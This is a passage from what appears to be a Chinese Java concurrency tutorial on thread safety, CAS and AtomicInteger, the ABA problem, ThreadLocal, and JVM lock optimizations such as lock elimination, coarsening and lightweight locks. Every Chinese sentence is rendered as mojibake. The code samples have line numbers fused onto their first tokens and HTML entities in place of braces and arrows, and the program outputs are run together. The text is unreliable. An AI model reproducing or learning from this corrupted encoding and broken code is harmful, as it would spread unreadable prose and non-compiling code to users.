èƒ½æ­£ç¡®æ‰§è¡Œä¸‹å»ï¼Œå°±éœ€è¦å¯¹åˆ é™¤å…ƒç´ å’Œè·å–å…ƒç´ çš„ä»£ç è¿›è¡ŒåŒæ­¥ã€‚ 1234567891011121314executorService.execute(() -&gt; &#123; synchronized (vector) &#123; for (int i = 0; i &lt; vector.size(); i++) &#123; vector.remove(i); &#125; &#125;&#125;);executorService.execute(() -&gt; &#123; synchronized (vector) &#123; for (int i = 0; i &lt; vector.size(); i++) &#123; vector.get(i); &#125; &#125;&#125;); 4. çº¿ç¨‹å…¼å®¹çº¿ç¨‹å…¼å®¹æ˜¯æŒ‡å¯¹è±¡æœ¬èº«å¹¶ä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡åœ¨è°ƒç”¨ç«¯æ­£ç¡®åœ°ä½¿ç”¨åŒæ­¥æ‰‹æ®µæ¥ä¿è¯å¯¹è±¡åœ¨å¹¶å‘ç¯å¢ƒä¸­å¯ä»¥å®‰å…¨åœ°ä½¿ç”¨ï¼Œæˆ‘ä»¬å¹³å¸¸è¯´ä¸€ä¸ªç±»ä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œç»å¤§å¤šæ•°æ—¶å€™æŒ‡çš„æ˜¯è¿™ä¸€ç§æƒ…å†µã€‚Java API ä¸­å¤§éƒ¨åˆ†çš„ç±»éƒ½æ˜¯å±äºçº¿ç¨‹å…¼å®¹çš„ï¼Œå¦‚ä¸å‰é¢çš„ Vector å’Œ HashTable ç›¸å¯¹åº”çš„é›†åˆç±» ArrayList å’Œ HashMap ç­‰ã€‚ 5. çº¿ç¨‹å¯¹ç«‹çº¿ç¨‹å¯¹ç«‹æ˜¯æŒ‡æ— è®ºè°ƒç”¨ç«¯æ˜¯å¦é‡‡å–äº†åŒæ­¥æªæ–½ï¼Œéƒ½æ— æ³•åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸­å¹¶å‘ä½¿ç”¨çš„ä»£ç ã€‚ç”±äº Java è¯­è¨€å¤©ç”Ÿå°±å…·å¤‡å¤šçº¿ç¨‹ç‰¹æ€§ï¼Œçº¿ç¨‹å¯¹ç«‹è¿™ç§æ’æ–¥å¤šçº¿ç¨‹çš„ä»£ç æ˜¯å¾ˆå°‘å‡ºç°çš„ï¼Œè€Œä¸”é€šå¸¸éƒ½æ˜¯æœ‰å®³çš„ï¼Œåº”å½“å°½é‡é¿å…ã€‚ çº¿ç¨‹å®‰å…¨çš„å®ç°æ–¹æ³•1. äº’æ–¥åŒæ­¥synchronized å’Œ ReentrantLockã€‚ 2. éé˜»å¡åŒæ­¥äº’æ–¥åŒæ­¥æœ€ä¸»è¦çš„é—®é¢˜å°±æ˜¯è¿›è¡Œçº¿ç¨‹é˜»å¡å’Œå”¤é†’æ‰€å¸¦æ¥çš„æ€§èƒ½é—®é¢˜ï¼Œå› æ­¤è¿™ç§åŒæ­¥ä¹Ÿç§°ä¸ºé˜»å¡åŒæ­¥ï¼ˆBlocking Synchronizationï¼‰ã€‚ ä»å¤„ç†é—®é¢˜çš„æ–¹å¼ä¸Šè¯´ï¼Œäº’æ–¥åŒæ­¥å±äºä¸€ç§æ‚²è§‚çš„å¹¶å‘ç­–ç•¥ï¼Œæ€»æ˜¯è®¤ä¸ºåªè¦ä¸å»åšæ­£ç¡®çš„åŒæ­¥æªæ–½ï¼ˆä¾‹å¦‚åŠ é”ï¼‰ï¼Œé‚£å°±è‚¯å®šä¼šå‡ºç°é—®é¢˜ï¼Œæ— è®ºå…±äº«æ•°æ®æ˜¯å¦çœŸçš„ä¼šå‡ºç°ç«äº‰ï¼Œå®ƒéƒ½è¦è¿›è¡ŒåŠ é”ï¼ˆè¿™é‡Œè®¨è®ºçš„æ˜¯æ¦‚å¿µæ¨¡å‹ï¼Œå®é™…ä¸Šè™šæ‹Ÿæœºä¼šä¼˜åŒ–æ‰å¾ˆå¤§ä¸€éƒ¨åˆ†ä¸å¿…è¦çš„åŠ é”ï¼‰ã€ç”¨æˆ·æ€æ ¸å¿ƒæ€è½¬æ¢ã€ç»´æŠ¤é”è®¡æ•°å™¨å’Œæ£€æŸ¥æ˜¯å¦æœ‰è¢«é˜»å¡çš„çº¿ç¨‹éœ€è¦å”¤é†’ç­‰æ“ä½œã€‚ éšç€ç¡¬ä»¶æŒ‡ä»¤é›†çš„å‘å±•ï¼Œæˆ‘ä»¬æœ‰äº†å¦å¤–ä¸€ä¸ªé€‰æ‹©ï¼šåŸºäºå†²çªæ£€æµ‹çš„ä¹è§‚å¹¶å‘ç­–ç•¥ï¼Œé€šä¿—åœ°è¯´ï¼Œå°±æ˜¯å…ˆè¿›è¡Œæ“ä½œï¼Œå¦‚æœæ²¡æœ‰å…¶ä»–çº¿ç¨‹äº‰ç”¨å…±äº«æ•°æ®ï¼Œé‚£æ“ä½œå°±æˆåŠŸäº†ï¼›å¦‚æœå…±äº«æ•°æ®æœ‰äº‰ç”¨ï¼Œäº§ç”Ÿäº†å†²çªï¼Œé‚£å°±å†é‡‡å–å…¶ä»–çš„è¡¥å¿æªæ–½ï¼ˆæœ€å¸¸è§çš„è¡¥å¿æªæ–½å°±æ˜¯ä¸æ–­åœ°é‡è¯•ï¼Œç›´åˆ°æˆåŠŸä¸ºæ­¢ï¼‰ï¼Œè¿™ç§ä¹è§‚çš„å¹¶å‘ç­–ç•¥çš„è®¸å¤šå®ç°éƒ½ä¸éœ€è¦æŠŠçº¿ç¨‹æŒ‚èµ·ï¼Œå› æ­¤è¿™ç§åŒæ­¥æ“ä½œç§°ä¸ºéé˜»å¡åŒæ­¥ï¼ˆNon-Blocking Synchronizationï¼‰ã€‚ ä¹è§‚é”éœ€è¦æ“ä½œå’Œå†²çªæ£€æµ‹è¿™ä¸¤ä¸ªæ­¥éª¤å…·å¤‡åŸå­æ€§ï¼Œè¿™é‡Œå°±ä¸èƒ½å†ä½¿ç”¨äº’æ–¥åŒæ­¥æ¥ä¿è¯äº†ï¼Œåªèƒ½é ç¡¬ä»¶æ¥å®Œæˆã€‚ç¡¬ä»¶æ”¯æŒçš„åŸå­æ€§æ“ä½œæœ€å…¸å‹çš„æ˜¯ï¼šæ¯”è¾ƒå¹¶äº¤æ¢ï¼ˆCompare-and-Swapï¼ŒCASï¼‰ã€‚ CAS æŒ‡ä»¤éœ€è¦æœ‰ 3 ä¸ªæ“ä½œæ•°ï¼Œåˆ†åˆ«æ˜¯å†…å­˜ä½ç½®ï¼ˆåœ¨ Java ä¸­å¯ä»¥ç®€å•ç†è§£ä¸ºå˜é‡çš„å†…å­˜åœ°å€ï¼Œç”¨ V è¡¨ç¤ºï¼‰ã€æ—§çš„é¢„æœŸå€¼ï¼ˆç”¨ A è¡¨ç¤ºï¼‰å’Œæ–°å€¼ï¼ˆç”¨ B è¡¨ç¤ºï¼‰ã€‚CAS æŒ‡ä»¤æ‰§è¡Œæ—¶ï¼Œå½“ä¸”ä»…å½“ V ç¬¦åˆæ—§é¢„æœŸå€¼ A æ—¶ï¼Œå¤„ç†å™¨ç”¨æ–°å€¼ B æ›´æ–° V çš„å€¼ï¼Œå¦åˆ™å®ƒå°±ä¸æ‰§è¡Œæ›´æ–°ã€‚ä½†æ˜¯æ— è®ºæ˜¯å¦æ›´æ–°äº† V çš„å€¼ï¼Œéƒ½ä¼šè¿”å› V çš„æ—§å€¼ï¼Œä¸Šè¿°çš„å¤„ç†è¿‡ç¨‹æ˜¯ä¸€ä¸ªåŸå­æ“ä½œã€‚ J.U.C åŒ…é‡Œé¢çš„æ•´æ•°åŸå­ç±» AtomicIntegerï¼Œå…¶ä¸­çš„ compareAndSet() å’Œ getAndIncrement() ç­‰æ–¹æ³•éƒ½ä½¿ç”¨äº† Unsafe ç±»çš„ CAS æ“ä½œã€‚ åœ¨ä¸‹é¢çš„ä»£ç  1 ä¸­ï¼Œä½¿ç”¨äº† AtomicInteger æ‰§è¡Œäº†è‡ªå¢çš„æ“ä½œã€‚ä»£ç  2 æ˜¯ incrementAndGet() çš„æºç ï¼Œå®ƒè°ƒç”¨äº† unsafe çš„ getAndAddInt() ã€‚ä»£ç  3 æ˜¯ getAndAddInt() æºç ï¼Œvar1 æŒ‡ç¤ºå†…å­˜ä½ç½®ï¼Œvar2 æŒ‡ç¤ºæ–°å€¼ï¼Œvar4 æŒ‡ç¤ºæ“ä½œéœ€è¦åŠ çš„æ•°å€¼ï¼Œè¿™é‡Œä¸º 1ã€‚åœ¨ä»£ç  3 çš„å®ç°ä¸­ï¼Œé€šè¿‡ getIntVolatile(var1, var2) å¾—åˆ°æ—§çš„é¢„æœŸå€¼ã€‚é€šè¿‡è°ƒç”¨ compareAndSwapInt() æ¥è¿›è¡Œ CAS æ¯”è¾ƒï¼Œå¦‚æœ var2=var5ï¼Œé‚£ä¹ˆå°±æ›´æ–°å†…å­˜åœ°å€ä¸º var1 çš„å˜é‡ä¸º var5+var4ã€‚å¯ä»¥çœ‹åˆ°ä»£ç  3 æ˜¯åœ¨ä¸€ä¸ªå¾ªç¯ä¸­è¿›è¡Œï¼Œå‘ç”Ÿå†²çªçš„åšæ³•æ˜¯ä¸æ–­çš„è¿›è¡Œé‡è¯•ã€‚ 123456// ä»£ç  1private AtomicInteger cnt = new AtomicInteger();public void add() &#123; cnt.incrementAndGet();&#125; 1234// ä»£ç  2public final int incrementAndGet() &#123; return unsafe.getAndAddInt(this, valueOffset, 1) + 1;&#125; 123456789// ä»£ç  3public final int getAndAddInt(Object var1, long var2, int var4) &#123; int var5; do &#123; var5 = this.getIntVolatile(var1, var2); &#125; while(!this.compareAndSwapInt(var1, var2, var5, var5 + var4)); return var5;&#125; ABA ï¼šå¦‚æœä¸€ä¸ªå˜é‡åˆæ¬¡è¯»å–çš„æ—¶å€™æ˜¯ A å€¼ï¼Œå®ƒçš„å€¼è¢«æ”¹æˆäº† Bï¼Œåæ¥åˆè¢«æ”¹å›ä¸º Aï¼Œé‚£ CAS æ“ä½œå°±ä¼šè¯¯è®¤ä¸ºå®ƒä»æ¥æ²¡æœ‰è¢«æ”¹å˜è¿‡ã€‚J.U.C åŒ…æä¾›äº†ä¸€ä¸ªå¸¦æœ‰æ ‡è®°çš„åŸå­å¼•ç”¨ç±»â€œAtomicStampedReferenceâ€æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå®ƒå¯ä»¥é€šè¿‡æ§åˆ¶å˜é‡å€¼çš„ç‰ˆæœ¬æ¥ä¿è¯ CAS çš„æ­£ç¡®æ€§ã€‚å¤§éƒ¨åˆ†æƒ…å†µä¸‹ ABA é—®é¢˜ä¸ä¼šå½±å“ç¨‹åºå¹¶å‘çš„æ­£ç¡®æ€§ï¼Œå¦‚æœéœ€è¦è§£å†³ ABA é—®é¢˜ï¼Œæ”¹ç”¨ä¼ ç»Ÿçš„äº’æ–¥åŒæ­¥å¯èƒ½ä¼šæ¯”åŸå­ç±»æ›´é«˜æ•ˆã€‚ 3. æ— åŒæ­¥æ–¹æ¡ˆè¦ä¿è¯çº¿ç¨‹å®‰å…¨ï¼Œå¹¶ä¸æ˜¯ä¸€å®šå°±è¦è¿›è¡ŒåŒæ­¥ï¼Œä¸¤è€…æ²¡æœ‰å› æœå…³ç³»ã€‚åŒæ­¥åªæ˜¯ä¿è¯å…±äº«æ•°æ®äº‰ç”¨æ—¶çš„æ­£ç¡®æ€§çš„æ‰‹æ®µï¼Œå¦‚æœä¸€ä¸ªæ–¹æ³•æœ¬æ¥å°±ä¸æ¶‰åŠå…±äº«æ•°æ®ï¼Œé‚£å®ƒè‡ªç„¶å°±æ— é¡»ä»»ä½•åŒæ­¥æªæ–½å»ä¿è¯æ­£ç¡®æ€§ï¼Œå› æ­¤ä¼šæœ‰ä¸€äº›ä»£ç å¤©ç”Ÿå°±æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚ ï¼ˆä¸€ï¼‰å¯é‡å…¥ä»£ç ï¼ˆReentrant Codeï¼‰ è¿™ç§ä»£ç ä¹Ÿå«åšçº¯ä»£ç ï¼ˆPure Codeï¼‰ï¼Œå¯ä»¥åœ¨ä»£ç æ‰§è¡Œçš„ä»»ä½•æ—¶åˆ»ä¸­æ–­å®ƒï¼Œè½¬è€Œå»æ‰§è¡Œå¦å¤–ä¸€æ®µä»£ç ï¼ˆåŒ…æ‹¬é€’å½’è°ƒç”¨å®ƒæœ¬èº«ï¼‰ï¼Œè€Œåœ¨æ§åˆ¶æƒè¿”å›åï¼ŒåŸæ¥çš„ç¨‹åºä¸ä¼šå‡ºç°ä»»ä½•é”™è¯¯ã€‚ç›¸å¯¹çº¿ç¨‹å®‰å…¨æ¥è¯´ï¼Œå¯é‡å…¥æ€§æ˜¯æ›´åŸºæœ¬çš„ç‰¹æ€§ï¼Œå®ƒå¯ä»¥ä¿è¯çº¿ç¨‹å®‰å…¨ï¼Œå³æ‰€æœ‰çš„å¯é‡å…¥çš„ä»£ç éƒ½æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œä½†æ˜¯å¹¶éæ‰€æœ‰çš„çº¿ç¨‹å®‰å…¨çš„ä»£ç éƒ½æ˜¯å¯é‡å…¥çš„ã€‚ å¯é‡å…¥ä»£ç æœ‰ä¸€äº›å…±åŒçš„ç‰¹å¾ï¼Œä¾‹å¦‚ä¸ä¾èµ–å­˜å‚¨åœ¨å †ä¸Šçš„æ•°æ®å’Œå…¬ç”¨çš„ç³»ç»Ÿèµ„æºã€ç”¨åˆ°çš„çŠ¶æ€é‡éƒ½ç”±å‚æ•°ä¸­ä¼ å…¥ã€ä¸è°ƒç”¨éå¯é‡å…¥çš„æ–¹æ³•ç­‰ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€ä¸ªç®€å•çš„åŸåˆ™æ¥åˆ¤æ–­ä»£ç æ˜¯å¦å…·å¤‡å¯é‡å…¥æ€§ï¼šå¦‚æœä¸€ä¸ªæ–¹æ³•ï¼Œå®ƒçš„è¿”å›ç»“æœæ˜¯å¯ä»¥é¢„æµ‹çš„ï¼Œåªè¦è¾“å…¥äº†ç›¸åŒçš„æ•°æ®ï¼Œå°±éƒ½èƒ½è¿”å›ç›¸åŒçš„ç»“æœï¼Œé‚£å®ƒå°±æ»¡è¶³å¯é‡å…¥æ€§çš„è¦æ±‚ï¼Œå½“ç„¶ä¹Ÿå°±æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚ ï¼ˆäºŒï¼‰æ ˆå°é—­ å¤šä¸ªçº¿ç¨‹è®¿é—®åŒä¸€ä¸ªæ–¹æ³•çš„å±€éƒ¨å˜é‡æ—¶ï¼Œä¸ä¼šå‡ºç°çº¿ç¨‹å®‰å…¨é—®é¢˜ï¼Œå› ä¸ºå±€éƒ¨å˜é‡å­˜å‚¨åœ¨æ ˆä¸­ï¼Œå±äºçº¿ç¨‹ç§æœ‰çš„ã€‚ 123456789101112import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;public class StackClosedExample &#123; public void add100() &#123; int cnt = 0; for (int i = 0; i &lt; 100; i++) &#123; cnt++; &#125; System.out.println(cnt); &#125;&#125; 1234567public static void main(String[] args) &#123; StackClosedExample example = new StackClosedExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; example.add100()); executorService.execute(() -&gt; example.add100()); executorService.shutdown();&#125; 12100100 ï¼ˆä¸‰ï¼‰çº¿ç¨‹æœ¬åœ°å­˜å‚¨ï¼ˆThread Local Storageï¼‰ å¦‚æœä¸€æ®µä»£ç ä¸­æ‰€éœ€è¦çš„æ•°æ®å¿…é¡»ä¸å…¶ä»–ä»£ç å…±äº«ï¼Œé‚£å°±çœ‹çœ‹è¿™äº›å…±äº«æ•°æ®çš„ä»£ç æ˜¯å¦èƒ½ä¿è¯åœ¨åŒä¸€ä¸ªçº¿ç¨‹ä¸­æ‰§è¡Œã€‚å¦‚æœèƒ½ä¿è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥æŠŠå…±äº«æ•°æ®çš„å¯è§èŒƒå›´é™åˆ¶åœ¨åŒä¸€ä¸ªçº¿ç¨‹ä¹‹å†…ï¼Œè¿™æ ·ï¼Œæ— é¡»åŒæ­¥ä¹Ÿèƒ½ä¿è¯çº¿ç¨‹ä¹‹é—´ä¸å‡ºç°æ•°æ®äº‰ç”¨çš„é—®é¢˜ã€‚ ç¬¦åˆè¿™ç§ç‰¹ç‚¹çš„åº”ç”¨å¹¶ä¸å°‘è§ï¼Œå¤§éƒ¨åˆ†ä½¿ç”¨æ¶ˆè´¹é˜Ÿåˆ—çš„æ¶æ„æ¨¡å¼ï¼ˆå¦‚â€œç”Ÿäº§è€…-æ¶ˆè´¹è€…â€æ¨¡å¼ï¼‰éƒ½ä¼šå°†äº§å“çš„æ¶ˆè´¹è¿‡ç¨‹å°½é‡åœ¨ä¸€ä¸ªçº¿ç¨‹ä¸­æ¶ˆè´¹å®Œï¼Œå…¶ä¸­æœ€é‡è¦çš„ä¸€ä¸ªåº”ç”¨å®ä¾‹å°±æ˜¯ç»å…¸ Web äº¤äº’æ¨¡å‹ä¸­çš„â€œä¸€ä¸ªè¯·æ±‚å¯¹åº”ä¸€ä¸ªæœåŠ¡å™¨çº¿ç¨‹â€ï¼ˆThread-per-Requestï¼‰çš„å¤„ç†æ–¹å¼ï¼Œè¿™ç§å¤„ç†æ–¹å¼çš„å¹¿æ³›åº”ç”¨ä½¿å¾—å¾ˆå¤š Web æœåŠ¡ç«¯åº”ç”¨éƒ½å¯ä»¥ä½¿ç”¨çº¿ç¨‹æœ¬åœ°å­˜å‚¨æ¥è§£å†³çº¿ç¨‹å®‰å…¨é—®é¢˜ã€‚ å¯ä»¥ä½¿ç”¨ java.lang.ThreadLocal ç±»æ¥å®ç°çº¿ç¨‹æœ¬åœ°å­˜å‚¨åŠŸèƒ½ã€‚ å¯¹äºä»¥ä¸‹ä»£ç ï¼Œthread1 ä¸­è®¾ç½® threadLocal ä¸º 1ï¼Œè€Œ thread2 è®¾ç½® threadLocal ä¸º 2ã€‚è¿‡äº†ä¸€æ®µæ—¶é—´ä¹‹åï¼Œthread1 è¯»å– threadLocal ä¾ç„¶æ˜¯ 1ï¼Œä¸å— thread2 çš„å½±å“ã€‚ 123456789101112131415161718192021public class ThreadLocalExample &#123; public static void main(String[] args) &#123; ThreadLocal threadLocal = new ThreadLocal(); Thread thread1 = new Thread(() -&gt; &#123; threadLocal.set(1); try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println(threadLocal.get()); threadLocal.remove(); &#125;); Thread thread2 = new Thread(() -&gt; &#123; threadLocal.set(2); threadLocal.remove(); &#125;); thread1.start(); thread2.start(); &#125;&#125; 11 ä¸ºäº†ç†è§£ ThreadLocalï¼Œå…ˆçœ‹ä»¥ä¸‹ä»£ç ï¼š 12345678910111213141516public class ThreadLocalExample1 &#123; public static void main(String[] args) &#123; ThreadLocal threadLocal1 = new ThreadLocal(); ThreadLocal threadLocal2 = new ThreadLocal(); Thread thread1 = new Thread(() -&gt; &#123; threadLocal1.set(1); threadLocal2.set(1); &#125;); Thread thread2 = new Thread(() -&gt; &#123; threadLocal1.set(2); threadLocal2.set(2); &#125;); thread1.start(); thread2.start(); &#125;&#125; å®ƒæ‰€å¯¹åº”çš„åº•å±‚ç»“æ„å›¾ä¸ºï¼š æ¯ä¸ª Thread éƒ½æœ‰ä¸€ä¸ª ThreadLocal.ThreadLocalMap å¯¹è±¡ï¼ŒThread ç±»ä¸­å°±å®šä¹‰äº† ThreadLocal.ThreadLocalMap æˆå‘˜ã€‚ 123/* ThreadLocal values pertaining to this thread. This map is maintained * by the ThreadLocal class. */ThreadLocal.ThreadLocalMap threadLocals = null; å½“è°ƒç”¨ä¸€ä¸ª ThreadLocal çš„ set(T value) æ–¹æ³•æ—¶ï¼Œå…ˆå¾—åˆ°å½“å‰çº¿ç¨‹çš„ ThreadLocalMap å¯¹è±¡ï¼Œç„¶åå°† ThreadLocal-&gt;value é”®å€¼å¯¹æ’å…¥åˆ°è¯¥ Map ä¸­ã€‚ 12345678public void set(T value) &#123; Thread t = Thread.currentThread(); ThreadLocalMap map = getMap(t); if (map != null) map.set(this, value); else createMap(t, value);&#125; get() æ–¹æ³•ç±»ä¼¼ã€‚ 12345678910111213public T get() &#123; Thread t = Thread.currentThread(); ThreadLocalMap map = getMap(t); if (map != null) &#123; ThreadLocalMap.Entry e = map.getEntry(this); if (e != null) &#123; @SuppressWarnings("unchecked") T result = (T)e.value; return result; &#125; &#125; return setInitialValue();&#125; ThreadLocal ä»ç†è®ºä¸Šè®²å¹¶ä¸æ˜¯ç”¨æ¥è§£å†³å¤šçº¿ç¨‹å¹¶å‘é—®é¢˜çš„ï¼Œå› ä¸ºæ ¹æœ¬ä¸å­˜åœ¨å¤šçº¿ç¨‹ç«äº‰ã€‚åœ¨ä¸€äº›åœºæ™¯ (å°¤å…¶æ˜¯ä½¿ç”¨çº¿ç¨‹æ± ) ä¸‹ï¼Œç”±äº ThreadLocal.ThreadLocalMap çš„åº•å±‚æ•°æ®ç»“æ„å¯¼è‡´ ThreadLocal æœ‰å†…å­˜æ³„æ¼çš„æƒ…å†µï¼Œå°½å¯èƒ½åœ¨æ¯æ¬¡ä½¿ç”¨ ThreadLocal åæ‰‹åŠ¨è°ƒç”¨ remove()ï¼Œä»¥é¿å…å‡ºç° ThreadLocal ç»å…¸çš„å†…å­˜æ³„æ¼ç”šè‡³æ˜¯é€ æˆè‡ªèº«ä¸šåŠ¡æ··ä¹±çš„é£é™©ã€‚ åäºŒã€é”ä¼˜åŒ–è¿™é‡Œçš„é”ä¼˜åŒ–ä¸»è¦æ˜¯æŒ‡è™šæ‹Ÿæœºå¯¹ synchronized çš„ä¼˜åŒ–ã€‚ è‡ªæ—‹é”äº’æ–¥åŒæ­¥çš„è¿›å…¥é˜»å¡çŠ¶æ€çš„å¼€é”€éƒ½å¾ˆå¤§ï¼Œåº”è¯¥å°½é‡é¿å…ã€‚åœ¨è®¸å¤šåº”ç”¨ä¸­ï¼Œå…±äº«æ•°æ®çš„é”å®šçŠ¶æ€åªä¼šæŒç»­å¾ˆçŸ­çš„ä¸€æ®µæ—¶é—´ã€‚è‡ªæ—‹é”çš„æ€æƒ³æ˜¯è®©ä¸€ä¸ªçº¿ç¨‹åœ¨è¯·æ±‚ä¸€ä¸ªå…±äº«æ•°æ®çš„é”æ—¶æ‰§è¡Œå¿™å¾ªç¯ï¼ˆè‡ªæ—‹ï¼‰ä¸€æ®µæ—¶é—´ï¼Œå¦‚æœåœ¨è¿™æ®µæ—¶é—´å†…èƒ½è·å¾—é”ï¼Œå°±å¯ä»¥é¿å…è¿›å…¥é˜»å¡çŠ¶æ€ã€‚ è‡ªé€‰é”è™½ç„¶èƒ½é¿å…è¿›å…¥é˜»å¡çŠ¶æ€ä»è€Œå‡å°‘å¼€é”€ï¼Œä½†æ˜¯å®ƒéœ€è¦è¿›è¡Œå¿™å¾ªç¯æ“ä½œå ç”¨ CPU æ—¶é—´ï¼Œå®ƒåªé€‚ç”¨äºå…±äº«æ•°æ®çš„é”å®šçŠ¶æ€å¾ˆçŸ­çš„åœºæ™¯ã€‚ åœ¨ JDK 1.6 ä¸­å¼•å…¥äº†è‡ªé€‚åº”çš„è‡ªæ—‹é”ã€‚è‡ªé€‚åº”æ„å‘³ç€è‡ªæ—‹çš„æ¬¡æ•°ä¸å†å›ºå®šäº†ï¼Œè€Œæ˜¯ç”±å‰ä¸€æ¬¡åœ¨åŒä¸€ä¸ªé”ä¸Šçš„è‡ªæ—‹æ¬¡æ•°åŠé”çš„æ‹¥æœ‰è€…çš„çŠ¶æ€æ¥å†³å®šã€‚ é”æ¶ˆé™¤é”æ¶ˆé™¤æ˜¯æŒ‡å¯¹äºè¢«æ£€æµ‹å‡ºä¸å¯èƒ½å­˜åœ¨ç«äº‰çš„å…±äº«æ•°æ®çš„é”è¿›è¡Œæ¶ˆé™¤ã€‚ é”æ¶ˆé™¤ä¸»è¦æ˜¯é€šè¿‡é€ƒé€¸åˆ†ææ¥æ”¯æŒï¼Œå¦‚æœå †ä¸Šçš„å…±äº«æ•°æ®ä¸å¯èƒ½é€ƒé€¸å‡ºå»è¢«å…¶å®ƒçº¿ç¨‹è®¿é—®åˆ°ï¼Œé‚£ä¹ˆå°±å¯ä»¥æŠŠå®ƒä»¬å½“æˆç§æœ‰æ•°æ®å¯¹å¾…ï¼Œä¹Ÿå°±å¯ä»¥å°†å®ƒä»¬çš„é”è¿›è¡Œæ¶ˆé™¤ã€‚ å¯¹äºä¸€äº›çœ‹èµ·æ¥æ²¡æœ‰åŠ é”çš„ä»£ç ï¼Œå…¶å®éšå¼çš„åŠ äº†å¾ˆå¤šé”ã€‚ä¾‹å¦‚ä¸‹é¢çš„å­—ç¬¦ä¸²æ‹¼æ¥ä»£ç å°±éšå¼åŠ äº†é”ï¼š 123public static String concatString(String s1, String s2, String s3) &#123; return s1 + s2 + s3;&#125; String æ˜¯ä¸€ä¸ªä¸å¯å˜çš„ç±»ï¼Œç¼–è¯‘å™¨ä¼šå¯¹ String çš„æ‹¼æ¥è‡ªåŠ¨ä¼˜åŒ–ã€‚åœ¨ JDK 1.5 ä¹‹å‰ï¼Œä¼šè½¬åŒ–ä¸º StringBuffer å¯¹è±¡çš„è¿ç»­ append() æ“ä½œï¼š 1234567public static String concatString(String s1, String s2, String s3) &#123; StringBuffer sb = new StringBuffer(); sb.append(s1); sb.append(s2); sb.append(s3); return sb.toString();&#125; æ¯ä¸ª append() æ–¹æ³•ä¸­éƒ½æœ‰ä¸€ä¸ªåŒæ­¥å—ã€‚è™šæ‹Ÿæœºè§‚å¯Ÿå˜é‡ sbï¼Œå¾ˆå¿«å°±ä¼šå‘ç°å®ƒçš„åŠ¨æ€ä½œç”¨åŸŸè¢«é™åˆ¶åœ¨ concatString() æ–¹æ³•å†…éƒ¨ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œsb çš„æ‰€æœ‰å¼•ç”¨æ°¸è¿œä¸ä¼šâ€œé€ƒé€¸â€åˆ° concatString() æ–¹æ³•ä¹‹å¤–ï¼Œå…¶ä»–çº¿ç¨‹æ— æ³•è®¿é—®åˆ°å®ƒï¼Œå› æ­¤å¯ä»¥è¿›è¡Œæ¶ˆé™¤ã€‚ é”ç²—åŒ–å¦‚æœä¸€ç³»åˆ—çš„è¿ç»­æ“ä½œéƒ½å¯¹åŒä¸€ä¸ªå¯¹è±¡åå¤åŠ é”å’Œè§£é”ï¼Œé¢‘ç¹çš„åŠ é”æ“ä½œå°±ä¼šå¯¼è‡´æ€§èƒ½æŸè€—ã€‚ ä¸Šä¸€èŠ‚çš„ç¤ºä¾‹ä»£ç ä¸­è¿ç»­çš„ append() æ–¹æ³•å°±å±äºè¿™ç±»æƒ…å†µã€‚å¦‚æœè™šæ‹Ÿæœºæ¢æµ‹åˆ°ç”±è¿™æ ·çš„ä¸€ä¸²é›¶ç¢çš„æ“ä½œéƒ½å¯¹åŒä¸€ä¸ªå¯¹è±¡åŠ é”ï¼Œå°†ä¼šæŠŠåŠ é”çš„èŒƒå›´æ‰©å±•ï¼ˆç²—åŒ–ï¼‰åˆ°æ•´ä¸ªæ“ä½œåºåˆ—çš„å¤–éƒ¨ã€‚å¯¹äºä¸Šä¸€èŠ‚çš„ç¤ºä¾‹ä»£ç å°±æ˜¯æ‰©å±•åˆ°ç¬¬ä¸€ä¸ª append() æ“ä½œä¹‹å‰ç›´è‡³æœ€åä¸€ä¸ª append() æ“ä½œä¹‹åï¼Œè¿™æ ·åªéœ€è¦åŠ é”ä¸€æ¬¡å°±å¯ä»¥äº†ã€‚ è½»é‡çº§é”JDK 1.6 å¼•å…¥äº†åå‘é”å’Œè½»é‡çº§é”ï¼Œä»è€Œè®©é”æ‹¥æœ‰äº†å››ä¸ªçŠ¶æ€ï¼šæ— é”çŠ¶æ€ï¼ˆunlockedï¼‰ã€åå‘é”çŠ¶æ€ï¼ˆbiasbleï¼‰ã€è½»é‡çº§é”çŠ¶æ€ï¼ˆlightweight lockedï¼‰å’Œé‡é‡çº§é”çŠ¶æ€ï¼ˆinflatedï¼‰ã€‚ ä»¥ä¸‹æ˜¯ HotSpot è™šæ‹Ÿæœºå¯¹è±¡å¤´çš„å†…å­˜å¸ƒå±€ï¼Œè¿™äº›æ•°æ®è¢«ç§°ä¸º mark wordã€‚å…¶ä¸­ tag bits å¯¹åº”äº†äº”ä¸ªçŠ¶æ€ï¼Œè¿™äº›çŠ¶æ€åœ¨å³ä¾§çš„ state è¡¨æ ¼ä¸­ç»™å‡ºï¼Œåº”è¯¥æ³¨æ„çš„æ˜¯ state è¡¨æ ¼ä¸æ˜¯å­˜å‚¨åœ¨å¯¹è±¡å¤´ä¸­çš„ã€‚é™¤äº† marked for gc çŠ¶æ€ï¼Œå…¶å®ƒå››ä¸ªçŠ¶æ€å·²ç»åœ¨å‰é¢ä»‹ç»è¿‡äº†ã€‚ ä¸‹å›¾å·¦ä¾§æ˜¯ä¸€ä¸ªçº¿ç¨‹çš„è™šæ‹Ÿæœºæ ˆï¼Œå…¶ä¸­æœ‰ä¸€éƒ¨åˆ†ç§°ä¸º Lock Record çš„åŒºåŸŸï¼Œè¿™æ˜¯åœ¨è½»é‡çº§é”è¿è¡Œè¿‡ç¨‹åˆ›å»ºçš„ï¼Œç”¨äºå­˜æ”¾é”å¯¹è±¡çš„ Mark Wordã€‚è€Œå³ä¾§å°±æ˜¯ä¸€ä¸ªé”å¯¹è±¡ï¼ŒåŒ…å«äº† Mark Word å’Œå…¶å®ƒä¿¡æ¯ã€‚ è½»é‡çº§é”æ˜¯ç›¸å¯¹äºä¼ 